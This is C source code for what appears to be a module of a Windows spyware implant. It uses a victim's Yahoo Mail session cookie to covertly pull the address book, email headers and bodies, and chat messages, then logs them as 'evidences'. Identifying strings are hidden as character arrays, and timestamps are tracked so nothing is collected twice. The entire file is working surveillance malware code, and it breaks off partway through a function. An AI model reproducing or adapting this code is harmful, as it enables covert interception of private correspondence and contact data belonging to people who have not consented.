#include <Windows.h>
#include <stdio.h>
#include <time.h>

#include "debug.h"
#include "zmem.h"
#include "utils.h"
#include "social.h"
#include "facebook.h"
#include "yahoo.h"
#include "conf.h"
#include "base64.h"



//writes data on disk
void DumpYHTcpData(LPCWSTR lpFileName, char* lpBuffer, DWORD dwSize)
{
	HANDLE hFile;
	DWORD dwWritten=0;

	//creazione del file dove salvare i dati
	hFile = CreateFile(lpFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
		return;

	//scrittura dei dati sul file
	if(!WriteFile(hFile, lpBuffer, dwSize, &dwWritten, NULL))
	{
		CloseHandle(hFile);
		return;
	}

	CloseHandle(hFile);
}

//writes data on disk
void DumpYHTcpData(LPCWSTR lpFileName, WCHAR* lpBuffer, DWORD dwSize)
{
	HANDLE hFile;
	DWORD dwWritten=0;

	//creazione del file dove salvare i dati
	hFile = CreateFile(lpFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
		return;

	//scrittura dei dati sul file
	if(!WriteFile(hFile, lpBuffer, dwSize*2, &dwWritten, NULL))
	{
		CloseHandle(hFile);
		return;
	}

	CloseHandle(hFile);
}


//encode a string to URL format, for parameters passed in URL
LPSTR EncodeURL(LPSTR strString)
{
	LPSTR strEncoded = NULL;
	char strTmp[4];
	int i, j, dwLen;

	dwLen = strlen(strString);
	//alloc destination string
	strEncoded = (LPSTR)zalloc((dwLen*3) + 1);
	if(strEncoded == NULL)
		return NULL;

	SecureZeroMemory(strEncoded, sizeof(dwLen*3+1));

	for(i=0, j=0; i<dwLen; i++, j++)
	{
		switch(strString[i])
		{
			case '$':
			case '&':
			case '+':
			case ')':
			case ',':
			case ':':
			case ';':
			case '=':
			case '?':
			case '@':
				strEncoded[j++] = '%';
				sprintf(strTmp, "%02X", strString[i]);
				strcat(&strEncoded[j], strTmp);
				j += 1;
				break;
			default:
				strEncoded[j] = strString[i];
				break;
		}
	}
	strEncoded[j] = 0;

	return strEncoded;
}

//cerca un identifier all'interno di un buffer e ne restituisce il valore
BOOL YHSearchIdentifier(LPWSTR *strId, LPSTR strBuffer, LPSTR strIdTag, char cEndOfId, int nMaxLen)
{
	LPSTR lpTmp = NULL;
	int i;

	if(strBuffer == NULL)
		return FALSE;

	//cerca l'identifier all'interno del buffer
	lpTmp = strstr(strBuffer, strIdTag);
	if (lpTmp)
	{
		lpTmp += strlen(strIdTag);

		//cerco fino al primo carattere 'cEndOfID' o fino a max_len
		for (i=0; i<nMaxLen; i++)
		{
			if((*(lpTmp+i) == cEndOfId) || (*(lpTmp+i) == '\0'))
				break;
		}

		if(i < nMaxLen)
		{
			//copio il valore trovato
			*strId = (LPWSTR)zalloc((i+1)*sizeof(WCHAR));
			if(*strId == NULL)
				return FALSE;

			_snwprintf_s(*strId, i+1, _TRUNCATE, L"%S", lpTmp);
			return TRUE;
		}
	}

	return FALSE;
}


//format the request id used in the session
//es: UUID   -> 88cee993-80ce-5292-01d0-a7SEQN010000
//    ReqNum -> 1
//    ReqID  =  88cee993-80ce-5292-01d0-a70000010000
BOOL YHFormatRequestID(LPWSTR* lpszReqID, LPYAHOO_CONNECTION_PARAMS pYHParams)
{
	WCHAR	szReqVal[8];
	LPWSTR	pszSubString;
	DWORD	dwSize;
	
	pszSubString = wcsstr(pYHParams->strUUID, L"SEQN");
	if(pszSubString == NULL)
		return FALSE;
	
	_snwprintf_s(szReqVal, (sizeof(szReqVal)/2), _TRUNCATE, L"%04X", pYHParams->nReqValue);

	//alloc memory for the new string
	dwSize = wcslen(pYHParams->strUUID) + 1;

	*lpszReqID = (LPWSTR)zalloc(dwSize * sizeof(WCHAR));
	if(*lpszReqID == NULL)
		return FALSE;

	//copy the uuid string till the SEQN
	wcsncpy_s(*lpszReqID, dwSize, pYHParams->strUUID, (pszSubString - pYHParams->strUUID));
	//concat the counter
	wcscat_s(*lpszReqID, dwSize, szReqVal);

	//concat the last part of the string
	DWORD dwLen = wcslen(pszSubString+4);
	wcscat_s(*lpszReqID, dwSize, pszSubString+4);

	//increment the req. number
	pYHParams->nReqValue += 1;

	return TRUE;
}


//estrae tutti i parametri necessari
BOOL YHParseForParams(LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR strBuffer)
{
	//make sure the structure's fields are not allocated
	YHFreeConnectionParams(pYHParams);

	//server name (in caso di redirect, es: it-mg42.mail.yahoo.com)
	if(!YHSearchIdentifier(&pYHParams->strServerName, strBuffer, YAHOO_SERVERNAME_TAG, '"', 50))
		return FALSE;

	//wssid
	if(!YHSearchIdentifier(&pYHParams->strWSSID,	 strBuffer, YAHOO_WSSID_TAG, '"', 50))
		return FALSE;

	//neoguid
	if(!YHSearchIdentifier(&pYHParams->strNeoGUID,  strBuffer, YAHOO_NEOGUID_TAG, '"', 50))
		return FALSE;

	//uuid
	if(!YHSearchIdentifier(&pYHParams->strUUID,	 strBuffer, YAHOO_UUID_TAG, '"', 50))
		return FALSE;

/*
	//random value
	if(!YHSearchIdentifier(&pYHParams->strRndValue, strBuffer, YAHOO_RANDOM_VALUE_TAG, '"', 50))
		return FALSE;
*/
	return TRUE;
}


//get connection parameters to use in next queries
DWORD YHGetConnectionParams(LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR strCookie)
{
	LPWSTR	strDomain		= L"mail.yahoo.com";
	LPSTR	strRecvBuffer	= NULL;
	LPWSTR	strURI			= NULL;
	DWORD	dwRet, dwBufferSize;

	//connection to mail server
	dwRet = HttpSocialRequest(L"mail.yahoo.com", L"GET", strURI, 443, NULL, 0, (LPBYTE *)&strRecvBuffer, &dwBufferSize, strCookie); // FIXME ARRAY
	znfree((LPVOID*)&strURI);
	
	if (dwRet != SOCIAL_REQUEST_SUCCESS)
	{
		znfree((LPVOID*)&strRecvBuffer);
		return dwRet;
	}

	#ifdef _DEBUG
		//saved data to disk
		DumpYHTcpData(L"k:\\dump_yahoo.html", strRecvBuffer, dwBufferSize);
	#endif 

	//extract session parameters from the received buffer
	if (!YHParseForParams(pYHParams, strRecvBuffer))
	{
		znfree((LPVOID*)&strRecvBuffer);
		YHFreeConnectionParams(pYHParams);

		return SOCIAL_REQUEST_BAD_COOKIE;
	}

	znfree((LPVOID*)&strRecvBuffer);

	return SOCIAL_REQUEST_SUCCESS;
}


//================================================== YAHOO CONTACTS ===================================================================

//extact contacts from the json tree and write them into the log buffer
DWORD YHLogContacts(LPSTR strContacts, LPYAHOO_CONNECTION_PARAMS pYHParams)
{
	YAHOO_CONTACT_VALUES YHContact;

	std::vector<int>::size_type i = 0;
	std::vector<int>::size_type j = 0;
	JSONValue* jValue = NULL;
	JSONArray  jContacts;
	JSONArray  jFields;
	JSONObject jObj;
	JSONObject jContact;

	WCHAR strContact[]	= { L'c', L'o', L'n', L't', L'a', L'c', L't', L'\0' };
	WCHAR strID[]		= { L'i', L'd', L'\0' };
	WCHAR strFields[]	= { L'f', L'i', L'e', L'l', L'd', L's', L'\0' };
	WCHAR strRoot[]		= { L'c', L'o', L'n', L't', L'a', L'c', L't', L's', L'\0' };
	WCHAR strType[]		= { L't', L'y', L'p', L'e', L'\0' };
	WCHAR strValue[]	= { L'v', L'a', L'l', L'u', L'e', L'\0' };

	//fields name
	WCHAR strName[]		= { L'g', L'i', L'v', L'e', L'n', L'N', L'a', L'm', L'e', L'\0' };
	WCHAR strMidName[]	= { L'm', L'i', L'd', L'd', L'l', L'e', L'N', L'a', L'm', L'e', L'\0' };
	WCHAR strLastName[]	= { L'f', L'a', L'm', L'i', L'l', L'y', L'N', L'a', L'm', L'e', L'\0' };
	WCHAR strEmail[]	= { L'v', L'a', L'l', L'u', L'e', L'\0' };
	
	WCHAR  strBuffer[128];
	DWORD  dwLen, dwHTS=0, dwLTS=0, dwFlags=0;
	BOOL   bIsContact, bError;
	DWORD  dwLastID=0, dwID=0;	

	//parse the received buffer
	jValue = JSON::Parse(strContacts);

	if(jValue == NULL)
		return SOCIAL_REQUEST_BAD_COOKIE;

	if (jValue != NULL && jValue->IsObject())
	{
		jObj = jValue->AsObject(); //json root

		//find the contacts object
		if (jObj.find(strRoot) != jObj.end() && jObj[strRoot]->IsObject())
		{				
			jObj = jObj[strRoot]->AsObject();

			//check contact array
			if(jObj[strContact]->IsArray())
			{
				//contact array
				jContacts = jObj[strContact]->AsArray();

				//loop in contact array
				for(i=0; i<jContacts.size(); i++)
				{	
					bIsContact = FALSE;

					//yhfix
					if(!jContacts[i]->IsObject())
						continue;

					//contact object
					jObj = jContacts[i]->AsObject();

					//contact id
					dwID = (DWORD)jObj[strID]->AsNumber();

					//id comparison
					if(dwID > dwLastID)
						dwLastID = dwID;

					if(dwLastID <= pYHParams->dwLowTS)
						continue;

					//get fields array
					if(jObj[strFields]->IsArray())
					{
						SecureZeroMemory(&YHContact, sizeof(YHContact));

						//fields array
						jFields = jObj[strFields]->AsArray();
						
						//loop in fields array
						for(bError=FALSE, j=0; (j<jFields.size()) && (bError==FALSE); j++)
						{
							if(!jFields[j]->IsObject())
								continue;

							//object with contact values
							jObj = jFields[j]->AsObject();

							//yhfix
							if(!jObj[strType]->IsString())
								continue;

							//get the obj type (name or email)
							_snwprintf_s(strBuffer, sizeof(strBuffer)/2, _TRUNCATE, L"%s", jObj[strType]->AsString().c_str());
							
							//get obj values
							if(!wcscmp(strBuffer, L"name"))
							{
								if(!jObj[strValue]->IsObject())
									continue;
								jObj = jObj[strValue]->AsObject();

								//yhfix
								if(jObj[strName]->IsString() && jObj[strLastName]->IsString())
								{
									dwLen = wcslen(jObj[strName]->AsString().c_str()) + wcslen(jObj[strLastName]->AsString().c_str()) + 2; //(insert a blank char between name and lastname)
									YHContact.strName = (LPWSTR)zalloc(dwLen * (sizeof(WCHAR)));
									if(YHContact.strName != NULL)
									{
										_snwprintf_s(YHContact.strName, dwLen, _TRUNCATE, L"%s %s", jObj[strName]->AsString().c_str(), jObj[strLastName]->AsString().c_str());
										bIsContact = TRUE;
									}
									else
										bError = TRUE;							
								}
							}
							else if(!wcscmp(strBuffer, L"email"))
							{
								//yhfix
								if(jObj[strEmail]->IsString())
								{
									dwLen = wcslen(jObj[strEmail]->AsString().c_str()) + 1;
									YHContact.strEmail = (LPWSTR)zalloc(dwLen * (sizeof(WCHAR)));
									if(YHContact.strEmail != NULL)
									{
										_snwprintf_s(YHContact.strEmail, dwLen, _TRUNCATE, L"%s", jObj[strEmail]->AsString().c_str());
										bIsContact = TRUE;
									}
									else
										bError = TRUE;								
								}
							}						
							else if(!wcscmp(strBuffer, L"company"))
							{							
								//yhfix
								if(jObj[strValue]->IsString())
								{
									dwLen = wcslen(jObj[strValue]->AsString().c_str()) + 1;
									YHContact.strCompany = (LPWSTR)malloc(dwLen * (sizeof(WCHAR)));
									if(YHContact.strCompany != NULL)
									{
										_snwprintf_s(YHContact.strCompany, dwLen, _TRUNCATE, L"%s", jObj[strValue]->AsString().c_str());
										bIsContact = TRUE;
									}
									else
										bError = TRUE;
								}
							}
							else if(!wcscmp(strBuffer, L"phone"))
							{
								//yhfix
								if(jObj[strValue]->IsString())
								{
									dwLen = wcslen(jObj[strValue]->AsString().c_str()) + 1;
									YHContact.strPhone = (LPWSTR)malloc(dwLen * (sizeof(WCHAR)));
									if(YHContact.strPhone != NULL)
									{									
										_snwprintf_s(YHContact.strPhone, dwLen, _TRUNCATE, L"%s", jObj[strValue]->AsString().c_str());
										bIsContact = TRUE;									
									}
									else
										bError = TRUE;	
								}
							}

							//in case of alloc error, free the heap and exit
							if(bError)
							{
								YHFreeContactFields(&YHContact);
								delete jValue;

								return YAHOO_ALLOC_ERROR;
							}
						} // contact's field loop

						//save the contact
						if(bIsContact)
							SocialLogContactW(CONTACT_SRC_YAHOO, YHContact.strName, YHContact.strEmail,  YHContact.strCompany, NULL, NULL, NULL, YHContact.strPhone, NULL, YHContact.strName, NULL, dwFlags);

						//free heap
						YHFreeContactFields(&YHContact);
					}
				} // contacts loop
			}

			//set the timestamp
			if((bIsContact) && (dwLastID > 0))
			{
				pYHParams->dwLowTS = dwLastID;
				if(dwLastID != dwLTS)
					YHSetLastTimeStamp(pYHParams, "_c");
			}
		}
	}

	//free json value
	delete jValue;

	return YAHOO_SUCCESS;
}


//es: it-mg42.mail.yahoo.com/neo/ws/sd?/v1/user/VC2IYDFHJ3XN57AIDD3DACO5WI/contacts;format=json&view=compact&wssid=omTo4n11SJe&wssid=omTo4n11SJe&ymreqid=88cee993-80ce-5292-0124-c20001010000
DWORD YHParseContacts(LPSTR strCookie, LPYAHOO_CONNECTION_PARAMS pYHParams)
{
	LPWSTR strURI;
	LPSTR strRecvBuffer = NULL;
	DWORD dwRet, dwBufferSize;

	strURI = (LPWSTR) zalloc(YAHOO_ALLOC_SIZE * sizeof(WCHAR));
	if(strURI == NULL)
		return YAHOO_ALLOC_ERROR;

	_snwprintf_s(strURI, YAHOO_ALLOC_SIZE, _TRUNCATE,  L"/neo/ws/sd?/v1/user/%s/contacts;format=json&view=compact", pYHParams->strNeoGUID);
	dwRet = HttpSocialRequest(pYHParams->strServerName, L"GET", strURI, 443, NULL, 0, (LPBYTE *)&strRecvBuffer, &dwBufferSize, strCookie);
	znfree((LPVOID*)&strURI);

	#ifdef _DEBUG
		DumpYHTcpData(L"k:\\dump_social.html", strRecvBuffer, dwBufferSize);
	#endif

	if (dwRet != SOCIAL_REQUEST_SUCCESS)
	{
		znfree((LPVOID*)&strRecvBuffer);
		return dwRet;
	}

	//get last timestamp
	if(YHGetLastTimeStamp(pYHParams, "_c") == YAHOO_SUCCESS)
	{		
		//log contacts
		dwRet = YHLogContacts(strRecvBuffer, pYHParams);
		if(dwRet == YAHOO_SUCCESS)
			dwRet = SOCIAL_REQUEST_SUCCESS;
		else
			dwRet = SOCIAL_REQUEST_BAD_COOKIE;	
	}
	else
		dwRet = SOCIAL_REQUEST_BAD_COOKIE;	

	//free heap
	znfree((LPVOID*)&strRecvBuffer);

	return dwRet;
}


DWORD YahooContactHandler(LPSTR strCookie)
{		
	YAHOO_CONNECTION_PARAMS YHParams;

	if (!ConfIsModuleEnabled(L"addressbook"))
		return SOCIAL_REQUEST_SUCCESS;

	SecureZeroMemory(&YHParams, sizeof(YHParams));

	//get connection parameters used in queries
	DWORD dwRet = YHGetConnectionParams(&YHParams, strCookie);
	if (dwRet != SOCIAL_REQUEST_SUCCESS)
	{
		YHFreeConnectionParams(&YHParams);
		return dwRet;
	}

	//get conctacts list and log evidences
	dwRet = YHParseContacts(strCookie, &YHParams);
	if(dwRet != YAHOO_SUCCESS)
	{
		dwRet = SOCIAL_REQUEST_BAD_COOKIE;
	}

	//free connection parameters
	YHFreeConnectionParams(&YHParams);

	return dwRet;
}





//================================================== END OF YAHOO CONTACTS ===================================================================


//================================================== YAHOO MAIL ==============================================================================

/*
//con questo comando ottengo l'elenco della mail inviate
POST it-mg42.mail.yahoo.com/ws/mail/v2.0/jsonrpc?appid=YahooMailNeo&m=ListFolderThreads&wssid=1UaKTuwCE3a&ymreqid=88cee993-80ce-5292-01a5-8c0006010000

//con questo comando ricevo il corpo della mail
POST it-mg42.mail.yahoo.com/ws/v3/batch?appid=YahooMailNeo&prime=1&wssid=1UaKTuwCE3a&ymreqid=88cee993-80ce-5292-01a5-8c0009010000
POST it-mg42.mail.yahoo.com/ws/v3/batch?appid=YahooMailNeo&prime=1&wssid=/sMYYzRuleu&ymreqid=88cee993-80ce-5292-019f-0e0008010000
POST it-mg42.mail.yahoo.com/ws/v3/batch?appid=YahooMailNeo&prime=0&wssid=/sMYYzRuleu&ymreqid=88cee993-80ce-5292-019f-0e000a010000
*/


//get mails from a mailbox
DWORD YHParseMailBox(LPSTR strMailBoxName, LPSTR strCookie, LPYAHOO_CONNECTION_PARAMS pYHParams, BOOL bIncoming, BOOL bDraft)
{	
	//json vars
	std::vector<int>::size_type iItem;
	JSONValue *jValue = NULL;
	JSONArray  jMail;
	JSONObject jObj;
	
	LPSTR	strMail		  = NULL;
	LPSTR	strMailID	  = NULL;
	DWORD	dwLen, dwRet, dwNrOfMails, dwTimeStamp;
	
	WCHAR strDateFld[]	= { L'r', L'e', L'c', L'e', L'i', L'v', L'e', L'd', L'D', L'a', L't', L'e', L'\0' };
	WCHAR strMID[]		= { L'm', L'i', L'd', L'\0' };

	YAHOO_CHAT_FIELDS ChatFields;
	struct tm tstamp;

	//get the last timestamp for emails
	if(YHGetLastTimeStamp(pYHParams, strMailBoxName) != YAHOO_SUCCESS)
		return SOCIAL_REQUEST_BAD_COOKIE;

	//get mails list for the selected folder
	dwRet = YHGetMailsList(strMailBoxName, strCookie, pYHParams, &jValue, &jMail, &dwNrOfMails);
	if(dwRet != SOCIAL_REQUEST_SUCCESS)
	{
		delete jValue;
		return SOCIAL_REQUEST_BAD_COOKIE;
	}

	//no new mails to download
	if(dwNrOfMails == 0)
	{
		delete jValue;
		return SOCIAL_REQUEST_SUCCESS;
	}

	//paranoid test
	if(jValue == NULL)
		return SOCIAL_REQUEST_BAD_COOKIE;

	//save the mailbox name
	if(pYHParams->strMailFolder != NULL)
		znfree((LPVOID*)&pYHParams->strMailFolder);

	dwLen = strlen(strMailBoxName) + 1;
	pYHParams->strMailFolder = (LPWSTR)malloc(dwLen * sizeof(WCHAR));
	if(pYHParams->strMailFolder == NULL)
	{
		delete jValue;
		return YAHOO_ALLOC_ERROR;
	}

	swprintf_s(pYHParams->strMailFolder, dwLen, L"%S", strMailBoxName);

	//backward loop to get mails	
	for(iItem=dwNrOfMails; iItem>0; iItem--)
	{
		//yhfix
		if(!jMail[iItem-1]->IsObject())
			continue;

		//messageinfo obj
		jObj = jMail[iItem-1]->AsObject();
		
		//yhfix
		if(!jObj[strMID]->IsString())
			continue;

		//mail id
		dwLen = wcslen(jObj[strMID]->AsString().c_str()) + 1;
		if(dwLen <= 1)
			continue;

		//mid value (Mail ID)
		strMailID = (LPSTR)zalloc(dwLen);
		if(strMailID == NULL)
		{
			znfree((LPVOID*)&pYHParams->strMailFolder);
			delete jValue;
			return YAHOO_ALLOC_ERROR;
		}
		_snprintf_s(strMailID, dwLen, _TRUNCATE, "%S", jObj[strMID]->AsString().c_str());

		//get date from the list because it may be different from chat body date
		//causing duplicated logs. The mail to be logged are already filtered, by date,
		//in the YHGetMailsList function
		dwTimeStamp = (DWORD)jObj[strDateFld]->AsNumber();

		//chat or email selection
		if(!_stricmp(strMailBoxName, "%40C%40Chats"))
		{
			//get the conversation
			dwRet = YHGetChat(&ChatFields, strMailID, pYHParams, strCookie);
			if(dwRet == YAHOO_SUCCESS)
			{
				_gmtime32_s(&tstamp, (__time32_t *)&pYHParams->dwLastMailDate);
				tstamp.tm_year += 1900;
				tstamp.tm_mon++;
/*
				if(!_wcsicmp(ChatFields.strMailUser, ChatFields.strAuthorID))
					bIncoming = TRUE;
				else
					bIncoming = FALSE;
*/
				bIncoming = FALSE;
				SocialLogIMMessageW(CHAT_PROGRAM_YAHOO, ChatFields.strPeers, ChatFields.strPeersID, ChatFields.strAuthor, ChatFields.strAuthorID, ChatFields.strText, &tstamp, bIncoming);
			}

			//free heap
			YHFreeChatFields(&ChatFields);
		}
		else
		{
			//get the email
			dwRet = YHGetMail(&strMail, strMailID, pYHParams, strCookie);
			if(dwRet == YAHOO_SUCCESS)
			{
				dwLen = strlen(strMail);
				if(dwLen > DEFAULT_MAX_MAIL_SIZE)
					dwLen = DEFAULT_MAX_MAIL_SIZE;

				SocialLogMailFull(MAIL_YAHOO, strMail, dwLen, bIncoming, bDraft);
			}
		}

		//save the timestamp
		//pYHParams->dwLowTS = pYHParams->dwLastMailDate;
		pYHParams->dwLowTS = dwTimeStamp;
		YHSetLastTimeStamp(pYHParams, strMailBoxName);

		//free heap
		znfree((LPVOID*)&strMail);
		znfree((LPVOID*)&strMailID);

	} // end of for loop

	//free json value
	delete jValue;

/*
	//save the timestamp with the highest timestamp in the mail list.
	//(for an error in yahoo, the timestamp in the mail list can be different from the 
	//timestamp in the mail's body)
	if(pYHParams->dwLastMailDate < dwTimeStamp)
		pYHParams->dwLastMailDate = dwTimeStamp;

	pYHParams->dwLowTS = pYHParams->dwLastMailDate;
	YHSetLastTimeStamp(pYHParams, strMailBoxName);
*/

	//free name folder heap and set to NULL
	znfree((LPVOID*)&pYHParams->strMailFolder);	

	return dwRet;
}


//get mails list for the selected mailbox name (sort order: desc)
DWORD YHGetMailsList(LPSTR strMailBoxName, LPSTR strCookie, LPYAHOO_CONNECTION_PARAMS pYHParams, JSONValue** jValue, JSONArray* pjMail, LPDWORD pdwNrOfMails)
{	
	LPSTR	strJSONParams	= "{\"method\":\"ListMessages\",\"params\": [{\"fid\":\"%s\",\"numInfo\": %d,\"numMid\": %d,\"sortKey\": \"date\",\"sortOrder\":\"down\",\"groupBy\":\"unRead\"}]}";
	LPWSTR	strURI			= NULL;
	LPWSTR	strReqID		= NULL;
	LPSTR	strPostBuffer   = NULL;
	LPSTR	strRecvBuffer	= NULL;
	DWORD	dwRet, dwBufferSize, dwLastMailID=0, dwMailDate=0, dwNrOfMails=70, dwMaxTimeStamp=0;
	BOOL	bList			= FALSE;

	//json vars
	std::vector<int>::size_type i;
	JSONObject jObj;

	WCHAR strDateFld[]	= { L'r', L'e', L'c', L'e', L'i', L'v', L'e', L'd', L'D', L'a', L't', L'e', L'\0' };
	WCHAR strMID[]		= { L'm', L'i', L'd', L'\0' };
	WCHAR strMsgInfo[]	= { L'm', L'e', L's', L's', L'a', L'g', L'e', L'I', L'n', L'f', L'o', L'\0' };
	WCHAR strRoot[]		= { L'r', L'e', L's', L'u', L'l', L't', L'\0' };
	WCHAR strSize[]		= { L's', L'i', L'z', L'e', L'\0' };

	//format the request id
	if(!YHFormatRequestID(&strReqID, pYHParams))
		return SOCIAL_REQUEST_BAD_COOKIE;

	strURI = (LPWSTR)zalloc(YAHOO_ALLOC_SIZE*sizeof(WCHAR));
	if(strURI == NULL)
	{
		znfree((LPVOID*)&strReqID);
		return YAHOO_ALLOC_ERROR;
	}
	_snwprintf_s(strURI, YAHOO_ALLOC_SIZE, _TRUNCATE, L"/ws/mail/v2.0/jsonrpc?appid=YahooMailNeo&m=ListFolderThreads&wssid=%s&ymreqid=%s", pYHParams->strWSSID, strReqID);
	znfree((LPVOID*)&strReqID);

	//format the json paramaters
	strPostBuffer = (LPSTR)zalloc(YAHOO_ALLOC_SIZE);
	if(strPostBuffer == NULL)
	{		
		znfree((LPVOID*)&strURI);
		return YAHOO_ALLOC_ERROR;
	}
	//post params
	_snprintf_s(strPostBuffer, YAHOO_ALLOC_SIZE, _TRUNCATE, strJSONParams, strMailBoxName, dwNrOfMails, 0);

	//json command to retrieve the mail list
	dwRet = HttpSocialRequest(pYHParams->strServerName, L"POST", strURI, 443, (LPBYTE*)strPostBuffer, strlen(strPostBuffer), (LPBYTE *)&strRecvBuffer, &dwBufferSize, strCookie);

	//free buffers	
	znfree((LPVOID*)&strPostBuffer);		
	znfree((LPVOID*)&strURI);

	if (dwRet != SOCIAL_REQUEST_SUCCESS)
	{
		znfree((LPVOID*)&strRecvBuffer);
		return dwRet;
	}

	*pdwNrOfMails  = 0;
	dwMaxTimeStamp = 0;

	//parse the received buffer
	*jValue = JSON::Parse(strRecvBuffer);

	//free heap
	znfree((LPVOID*)&strRecvBuffer);

	if(*jValue == NULL)
		return SOCIAL_REQUEST_BAD_COOKIE;

	//json tree of mails list
	if ((*jValue)->IsObject())
	{
		jObj = (*jValue)->AsObject(); //json root

		//find the result object
		if (jObj.find(strRoot) != jObj.end() && jObj[strRoot]->IsObject())
		{	
			jObj = jObj[strRoot]->AsObject();

			if (jObj[strMsgInfo]->IsArray())
			{
				//messageInfo array
				*pjMail = jObj[strMsgInfo]->AsArray();
				
				//search the first mail with date < saved timestamp
				for(i=0; i<(*pjMail).size(); i++)
				{
					if(!(*pjMail)[i]->IsObject())
						continue;

					//json object containing the message
					jObj = (*pjMail)[i]->AsObject();

					//get the mail date
					dwMailDate = (DWORD)jObj[strDateFld]->AsNumber();
					if(dwMaxTimeStamp < dwMailDate)
						dwMaxTimeStamp = dwMailDate;

					//if the mail date is <= then the last mail sent, exit
					if(dwMailDate <= pYHParams->dwLowTS)
						break;				
				}
				*pdwNrOfMails = i;

				bList = TRUE;
			}
		}
	}
	else
	{		
		delete *jValue;
		*jValue = NULL;
	}

	if (bList == FALSE)
		return SOCIAL_REQUEST_BAD_COOKIE;

	return SOCIAL_REQUEST_SUCCESS;
}


//get mails list for the selected mailbox name (sort order: desc)
DWORD YHGetFoldersName(JSONValue** jValue, LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR strCookie)
{	
	LPSTR	strJSONParams	= "{\"method\":\"ListFolders\",\"params\": [{}]}";
	LPWSTR	strURI			= NULL;
	LPWSTR	strReqID		= NULL;
	LPSTR	strPostBuffer   = NULL;	
	LPSTR	strRecvBuffer	= NULL;
	DWORD	dwRet, dwBufferSize, dwLastMailID=0, dwMailDate=0;
	BOOL	bList			= FALSE;

	//json vars
//	JSONObject jObj;
//	WCHAR strFolderFld[]	= { L'f', L'o', L'l', L'd', L'e', L'r', L'\0' };			
//	WCHAR strRoot[]			= { L'r', L'e', L's', L'u', L'l', L't', L'\0' };

	//format the request id
	if(!YHFormatRequestID(&strReqID, pYHParams))
		return SOCIAL_REQUEST_BAD_COOKIE;

	strURI = (LPWSTR)zalloc(YAHOO_ALLOC_SIZE*sizeof(WCHAR));
	if(strURI == NULL)
	{
		znfree((LPVOID*)&strReqID);
		return YAHOO_ALLOC_ERROR;
	}

	//get folders name request
	_snwprintf_s(strURI, YAHOO_ALLOC_SIZE, _TRUNCATE, L"/ws/mail/v2.0/jsonrpc?appid=YahooMailNeo&m=ListFolderThreads&wssid=%s&ymreqid=%s", pYHParams->strWSSID, strReqID);
	znfree((LPVOID*)&strReqID);

	//format the json paramaters
	strPostBuffer = (LPSTR)zalloc(YAHOO_ALLOC_SIZE);
	if(strPostBuffer == NULL)
	{
		znfree((LPVOID*)&strURI);
		return YAHOO_ALLOC_ERROR;
	}
	strcpy_s(strPostBuffer, YAHOO_ALLOC_SIZE, strJSONParams);

	//json command to retrieve the mail list	
	dwRet = HttpSocialRequest(pYHParams->strServerName, L"POST", strURI, 443, (LPBYTE*)strPostBuffer, strlen(strPostBuffer), (LPBYTE *)&strRecvBuffer, &dwBufferSize, strCookie);

	//free heap
	znfree((LPVOID*)&strPostBuffer);
	znfree((LPVOID*)&strURI);

	if (dwRet != SOCIAL_REQUEST_SUCCESS)
	{
		znfree((LPVOID*)&strRecvBuffer);
		return dwRet;
	}
	
	//parse the received buffer	
	*jValue = JSON::Parse(strRecvBuffer);

	//free buffer
	znfree((LPVOID*)&strRecvBuffer);

	//json tree of mails list
	if ((*jValue == NULL) || ((*jValue)->IsObject() == FALSE))
	{
		//if the json is not an obj or it's null, return an error
		delete *jValue;

		return SOCIAL_REQUEST_BAD_COOKIE;
	}	

	return SOCIAL_REQUEST_SUCCESS;
}

//get the header and the body of the mail
DWORD YHGetMail(LPSTR* strMail, LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR strCookie)
{	
	LPSTR strMailHeader = NULL;
	LPSTR strMailBody	= NULL;
	DWORD dwRet=0, dwLen=0;

	//request mail with mail ID
	dwRet = YHGetMailBody(strMailID, pYHParams, strCookie, &strMailBody);
	if(dwRet != YAHOO_SUCCESS)
	{
		znfree((LPVOID*)&strMailBody);
		return dwRet;
	}

	//get mail row header
	dwRet = YHGetMailHeader(strMailID, pYHParams, strCookie, &strMailHeader);
	if(dwRet != YAHOO_SUCCESS)
	{
		znfree((LPVOID*)&strMailHeader);
		znfree((LPVOID*)&strMailBody);
		return dwRet;
	}

	//assemble email
	dwRet = YHAssembleMail(strMailHeader, strMailBody, strMail);
	if(dwRet != YAHOO_SUCCESS)
	{
		znfree((LPVOID*)&strMailHeader);
		znfree((LPVOID*)&strMailBody);
		return dwRet;
	}

	//free heap
	znfree((LPVOID*)&strMailHeader);
	znfree((LPVOID*)&strMailBody);

	return YAHOO_SUCCESS;
}


//request the header of a mail
DWORD YHGetMailHeader(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR strCookie, LPSTR* strMailHeader)
{
	LPSTR	strGetHeader	= "{\"method\": \"GetMessageRawHeader\",\"params\": [{\"fid\": \"%S\",\"mid\": [\"%s\"]}]}";
	LPSTR   strBuffer		= NULL;
	LPSTR   strRecvBuffer	= NULL;
	LPWSTR  strTmp			= NULL;
	LPWSTR	strURI			= NULL;
	LPWSTR	strReqID		= NULL;
	LPWSTR  pOldBuf			= NULL;
	DWORD	dwRet, dwBufferSize, dwSize, dwTotSize;

	//json vars
	std::vector<int>::size_type i;
	JSONValue* jValue = NULL;
	JSONArray  jHeader;
	JSONObject jObj;

	WCHAR strHeaders[]	= { L'r', L'a', L'w', L'h', L'e', L'a', L'd', L'e', L'r', L's', L'\0' };	//array
	WCHAR strRoot[]		= { L'r', L'e', L's', L'u', L'l', L't', L'\0' };							//object

	//format the request id
	if(!YHFormatRequestID(&strReqID, pYHParams))
	{
		znfree((LPVOID*)&strReqID);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}

	//get mail body
	strURI = (LPWSTR)zalloc(YAHOO_ALLOC_SIZE*sizeof(WCHAR));
	if(strURI == NULL)
	{
		znfree((LPVOID*)&strReqID);
		return YAHOO_ALLOC_ERROR;
	}

